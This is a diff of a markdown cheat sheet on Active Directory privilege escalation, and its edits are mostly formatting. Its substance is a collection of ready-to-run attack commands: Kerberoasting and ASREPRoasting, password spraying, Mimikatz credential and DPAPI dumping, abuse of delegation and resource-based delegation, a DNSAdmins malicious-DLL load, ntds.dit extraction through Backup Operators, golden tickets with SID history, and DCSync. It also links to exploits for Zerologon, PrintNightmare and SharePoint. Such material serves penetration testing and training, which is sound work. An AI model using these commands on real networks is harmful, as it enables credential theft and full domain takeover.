@@ -4,18 +4,18 @@
 
 ### Kerberoast
 
-_What is this:_  All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"  
+_What is this:_  All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"\
 account, extract the encrypted blob that was encrypted using the user's password and, brute force it offline.
 
 PowerView: Get User Accounts that are used as Service Accounts
 
-```text
+```
 Get-NetUser -SPN
 ```
 
 Get every available SPN account, request a TGS, and dump its hash
 
-```text
+```
 . .\Invoke-Kerberoast.ps1
 Invoke-Kerberoast -OutputFormat Hashcat
 Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'C:\Users\Administrator\Music\hash_capture.txt' -Width 8000
@@ -23,26 +23,26 @@ Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-O
 
 Requesting the TGS for a single account:
 
-```text
+```
 Request-SPNTicket
 ```
 
 Export all tickets using Mimikatz
 
-```text
+```
 Invoke-Mimikatz -Command '"kerberos::list /export"'
 ```
 
 **AD Module:**
 
-```text
+```
 Get User Accounts that are used as Service Accounts
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
 
 **Impacket-GetUsersSPNs:**
 
-```text
+```
 python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
 impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS -request -save -outputfile GetUserSPNs.out
 ```
@@ -51,37 +51,37 @@ Rubeus:
 
 Kerberoasting and outputing on a file with a specific format
 
-```text
+```
 Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>
 ```
 
 Kerberoasting while being "OPSEC" safe, essentially while not try to roast AES enabled accounts
 
-```text
+```
 Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec
 ```
 
 Kerberoast AES enabled accounts
 
-```text
+```
 Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes
 ```
 
 Kerberoast spesific user account
 
-```text
+```
 Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple
 ```
 
 #### Kerberoast by specifying the authentication credentials
 
-```text
+```
 Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
 ```
 
 ### ASREPRoast
 
-_What is this?:_  If a domain user account does not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted  
+_What is this?:_  If a domain user account does not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted\
 blob and brute force it offline.
 
 * PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
@@ -95,7 +95,7 @@ Check for interesting permissions on accounts:
 
 PowerView:
 
-```text
+```
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
 Disable Kerberos Preauth:
 Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
@@ -107,13 +107,13 @@ Finally, execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/AS
 
 Get a specific Accounts hash:
 
-```text
+```
 Get-ASREPHash -UserName <UserName> -Verbose
 ```
 
 Get any ASREPRoastable Users hashes:
 
-```text
+```
 Invoke-ASREPRoast -Verbose
 ```
 
@@ -121,19 +121,19 @@ Using Rubeus:
 
 Trying the attack for all domain users
 
-```text
+```
 Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
 ```
 
 ASREPRoast specific user
 
-```text
+```
 Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
 ```
 
-ASREPRoast users of a specific OU \(Organization Unit\)
+ASREPRoast users of a specific OU (Organization Unit)
 
-```text
+```
 Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
 ```
 
@@ -141,7 +141,7 @@ Using Impacket:
 
 Trying the attack for the specified users on the file
 
-```text
+```
 python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
 ```
 
@@ -154,39 +154,39 @@ If we have harvested some passwords by compromising a user account, we can use t
 * [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 * [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
-* [Spray](https://github.com/Greenwolf/Spray)
+*   [Spray](https://github.com/Greenwolf/Spray)
 
-  \*\*\*\*
+    ****
 
 {% embed url="https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1" %}
 
 We can use this PoC script to do a password spray attack:
 
-```text
+```
 .\Spray-Passwords.ps1 -Pass password -Admin
 ```
 
 ### **Force Set SPN**
 
-_What is this?: If we have enough permissions -&gt; GenericAll/GenericWrite we can set an SPN on a target account, request a TGS, then grab its blob and brute force it._
+_What is this?: If we have enough permissions -> GenericAll/GenericWrite we can set an SPN on a target account, request a TGS, then grab its blob and brute force it._
 
 * PowerView:
 
 Check for interesting permissions on accounts:
 
-```text
+```
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
 ```
 
 Check if the current user has already an SPN set:
 
-```text
+```
 Get-DomainUser -Identity <UserName> | select serviceprincipalname
 ```
 
 Force set the SPN on the account:
 
-```text
+```
 Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
 ```
 
@@ -194,13 +194,13 @@ AD Module:
 
 Check if the current user has already an SPN setted
 
-```text
+```
 Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName
 ```
 
 Force set the SPN on the account:
 
-```text
+```
 Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
 ```
 
@@ -210,27 +210,27 @@ Finally use any tool from before to grab the hash and kerberoast it!
 
 If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.
 
-List shadow copies using vssadmin \(Needs Admnistrator Access\)
+List shadow copies using vssadmin (Needs Admnistrator Access)
 
-```text
+```
 vssadmin list shadows
 ```
 
 List shadow copies using diskshadow
 
-```text
+```
 diskshadow list shadows all
 ```
 
 Make a symlink to the shadow copy and access it
 
-```text
+```
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
 
 1\) You can dump the backup SAM database and harvest credentials.
 
-2\) Look for DPAPI stored creds and decrypt them. 
+2\) Look for DPAPI stored creds and decrypt them.&#x20;
 
 3\) Access backup sensitive files.
 
@@ -243,35 +243,35 @@ Usually, encrypted credentials are stored in:
 
 By using the cred function of mimikatz we can enumerate the cred object and get information about it:
 
-```text
+```
 dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
 ```
 
 From the previous command we are interested in the "guidMasterKey" parameter, which tells us which masterkey was used to encrypt the credential Let's enumerate the Master Key:
 
-```text
+```
 dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"
 ```
 
-Now if we are in the context of the user \(or system\) that the credential belongs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controller:
+Now if we are in the context of the user (or system) that the credential belongs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controller:
 
-```text
+```
 dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc
 ```
 
 We now have the masterkey in our local cache:
 
-```text
+```
 dpapi::cache
 ```
 
 Finally, we can decrypt the credential using the cached masterkey:
 
-```text
+```
 dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
 ```
 
-Detailed Article: [DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
+Detailed Article: [DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-\~-credential-manager-saved-credentials)
 
 ### Unconstrained Delegation
 
@@ -281,32 +281,32 @@ Using PowerView:
 
 Discover domain- joined computers that have Unconstrained Delegation enabled
 
-```text
+```
 Get-NetComputer -UnConstrained
 ```
 
 List tickets and check if a DA or some High-Value target has stored its TGT
 
-```text
+```
 Invoke-Mimikatz -Command '"sekurlsa::tickets"'
 ```
 
 Command to monitor any incoming sessions on our compromised server
 
-```text
+```
 Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay   
 <WaitInterval> -Verbose
 ```
 
 Dump the tickets to disk:
 
-```text
+```
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 ```
 
 Impersonate the user using ptt attack:
 
-```text
+```
 Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
 ```
 
@@ -318,38 +318,38 @@ Using PowerView and Kekeo:
 
 Enumerate Users and Computers with constrained delegation
 
-```text
+```
 Get-DomainUser -TrustedToAuth
 Get-DomainComputer -TrustedToAuth
 ```
 
 If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
 
-```text
+```
 tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>
 ```
 
 Then using the TGT we have asked a TGS for a Service this user has Access to through constrained delegation
 
-```text
+```
 tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>
 ```
 
 Finally, use mimikatz to ptt the TGS
 
-```text
+```
 Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
 ```
 
 Alterntative method, using Rubeus:
 
-```text
+```
 Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt
 ```
 
 Now we can access the service as the impersonated user!
 
-**What if we have delegation rights for only a specific SPN? \(e.g TIME\):**
+**What if we have delegation rights for only a specific SPN? (e.g TIME):**
 
 In this case, we can still abuse a feature of Kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. That's gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.
 
@@ -369,21 +369,21 @@ Exploitation Example:
 
 Import Powermad and use it to create a new MACHINE ACCOUNT
 
-```text
+```
 . .\Powermad.ps1
 New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
 ```
 
 Import PowerView and get the SID of our new created machine account
 
-```text
+```
 . .\PowerView.ps1
 $ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid
 ```
 
 Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
 
-```text
+```
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
 $SDBytes = New-Object byte[] ($SD.BinaryLength) 
 $SD.GetBinaryForm($SDBytes, 0)
@@ -391,25 +391,25 @@ $SD.GetBinaryForm($SDBytes, 0)
 
 Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
 
-```text
+```
 Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
 ```
 
 After that we need to get the RC4 hash of the new machine account's password using Rubeus
 
-```text
+```
 Rubeus.exe hash /password:'p@ssword!'
 ```
 
 And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
 
-```text
+```
 Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt
 ```
 
 Finally we can access the C$ drive of the target machine
 
-```text
+```
 dir \\TargetMachine.wtver.domain\C$
 ```
 
@@ -422,7 +422,7 @@ In Constrain and Resource-Based Constrained Delegation if we don't have the pass
 
 Command on Rubeus
 
-```text
+```
 Rubeus.exe tgtdeleg /nowrap
 ```
 
@@ -435,21 +435,21 @@ _What is this?: If a user is a member of the DNSAdmins group, he can possibly lo
 1\) Enumerate the members of the DNSAdmins group:
 
 * PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
-* AD Module: `Get-ADGroupMember -Identiny DNSAdmins`
+*   AD Module: `Get-ADGroupMember -Identiny DNSAdmins`
 
-  2\) Once we found a member of this group we need to compromise it \(There are many ways\).
+    2\) Once we found a member of this group we need to compromise it (There are many ways).
 
-  3\) Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:
+    3\) Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:
 
 Using dnscmd:
 
-```text
+```
 dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll
 ```
 
 Restart the DNS Service:
 
-```text
+```
 sc \\DNSServer stop dns
 sc \\DNSServer start dns
 ```
@@ -458,9 +458,9 @@ sc \\DNSServer start dns
 
 * [Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)
 * [ADIDNS Revisited](https://blog.netspi.com/adidns-revisited/)
-* [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
+*   [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
 
-  **Abusing Backup Operators Group**
+    **Abusing Backup Operators Group**
 
 _What is this?: If we manage to compromise a user account that is a member of the Backup Operators group, we can then abuse its SeBackupPrivilege to create a shadow copy of the current state of the DC, extract the ntds.dit database file, dump the hashes and escalate our privileges to DA._
 
@@ -468,7 +468,7 @@ _What is this?: If we manage to compromise a user account that is a member of th
 
 Create a .txt file that will contain the shadow copy process script
 
-```text
+```
 Script ->{
 set context persistent nowriters  
 set metadata c:\windows\system32\spool\drivers\color\example.cab  
@@ -485,7 +485,7 @@ end backup
 
 Execute diskshadow with our script as parameter
 
-```text
+```
 diskshadow /s script.txt
 ```
 
@@ -493,112 +493,112 @@ diskshadow /s script.txt
 
 Importing both dlls from the repo using powershell
 
-```text
+```
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 Import-Module .\SeBackupPrivilegeUtils.dll
 ```
 
 Checking if the SeBackupPrivilege is enabled
 
-```text
+```
 Get-SeBackupPrivilege
 ```
 
 If it isn't we enable it
 
-```text
+```
 Set-SeBackupPrivilege
 ```
 
 Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
 
-```text
+```
 Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite
 ```
 
 Dump the SYSTEM hive
 
-```text
+```
 reg save HKLM\SYSTEM c:\temp\system.hive
 ```
 
-3\) Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine. 4\) Use secretsdump.py from impacket and dump the hashes. 5\) Use psexec or another tool of your choice to PTH and get Domain Admin access.
+3\) Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine. 4) Use secretsdump.py from impacket and dump the hashes. 5) Use psexec or another tool of your choice to PTH and get Domain Admin access.
 
 ### Abusing Exchange
 
 * [Abusing Exchange one Api call from DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
 * [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
-* [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange
+*   [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange
 
-  \*\*\*\*
+    ****
 
 ### **Weaponizing Printer Bug**
 
 * [Printer Server Bug to Domain Administrator](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)
-* [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)
+*   [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)
 
-  \*\*\*\*
+    ****
 
 ### **Abusing ACLs**
 
 * [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 * [aclpwn.py](https://github.com/fox-it/aclpwn.py)
-* [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)
+*   [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)
 
-  \*\*\*\*
+    ****
 
 ### **Abusing IPv6 with mitm6**
 
 * [Compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
-* [mitm6](https://github.com/fox-it/mitm6)
+*   [mitm6](https://github.com/fox-it/mitm6)
 
-  \*\*\*\*
+    ****
 
 ### **SID History Abuse**
 
-_What is this?: If we manage to compromise a child domain of a forest and_ [_SID filtering_](https://www.itprotoday.com/windows-8/sid-filtering) _isn't enabled \(most of the times is not\), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the_ [_SID History_](https://www.itprotoday.com/windows-8/sid-history) _field on a kerberos TGT ticket, that defines the "extra" security groups and privileges._
+_What is this?: If we manage to compromise a child domain of a forest and _[_SID filtering_](https://www.itprotoday.com/windows-8/sid-filtering)_ isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the _[_SID History_](https://www.itprotoday.com/windows-8/sid-history)_ field on a kerberos TGT ticket, that defines the "extra" security groups and privileges._
 
 Exploitation example:
 
 Get the SID of the Current Domain using PowerView
 
-```text
+```
 Get-DomainSID -Domain current.root.domain.local
 ```
 
 Get the SID of the Root Domain using PowerView
 
-```text
+```
 Get-DomainSID -Domain root.domain.local
 ```
 
 Create the Enteprise Admins SID
 
-```text
+```
 Format: RootDomainSID-519
 ```
 
 Forge "Extra" Golden Ticket using mimikatz
 
-```text
+```
 kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi
 ```
 
 Inject the ticket into memory
 
-```text
+```
 kerberos::ptt \path\to\ticket\golden.kirbi
 ```
 
 List the DC of the Root Domain
 
-```text
+```
 dir \\dc.root.domain.local\C$
 ```
 
-Alternatively, DCsync and dump the hashes using mimikatz 
+Alternatively, DCsync and dump the hashes using mimikatz&#x20;
 
-```text
+```
 lsadump::dcsync /domain:root.domain.local /all
 ```
 
@@ -609,19 +609,18 @@ Detailed Articles:
 
 ### **Exploiting SharePoint**
 
-* [CVE-2019-0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) RCE Exploitation \
+*   [CVE-2019-0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) RCE Exploitation \\
 
-  [PoC](https://github.com/k8gege/CVE-2019-0604)
-
+    [PoC](https://github.com/k8gege/CVE-2019-0604)
 * [CVE-2019-1257](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization)  Code execution through BDC deserialization
-* [CVE-2020-0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) RCE using typeconverters \
+*   [CVE-2020-0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) RCE using typeconverters \\
 
-  [PoC](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)
+    [PoC](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)
 
 ### ZeroLogon
 
 * [Zerologon: Unauthenticated domain controller compromise](https://www.secura.com/pathtoimg.php?id=2055): White paper of the vulnerability.
-* [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon): C\# implementation of the Zerologon exploit.
+* [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon): C# implementation of the Zerologon exploit.
 * [Invoke-ZeroLogon](https://github.com/BC-SECURITY/Invoke-ZeroLogon): Powershell implementation of the Zerologon exploit.
 * [Zer0Dump](https://github.com/bb00/zer0dump): Python implementation of the Zerologon exploit using the impacket library.
 
@@ -629,15 +628,13 @@ Detailed Articles:
 
 * [CVE-2021-34527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527): Vulnerability details.
 * [Impacket implementation of PrintNightmare](https://github.com/cube0x0/CVE-2021-1675): Reliable PoC of PrintNightmare using the impacket library.
-* [C\# Implementation of CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare): Reliable PoC of PrintNightmare written in C\#.
+* [C# Implementation of CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare): Reliable PoC of PrintNightmare written in C#.
 
 ## References and Up-to-Date Repos
 
 Most of the text here was extracted from these links:
 
-{% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md\#domain-privilege-escalation" %}
+{% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md#domain-privilege-escalation" %}
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md" %}
-
-
 
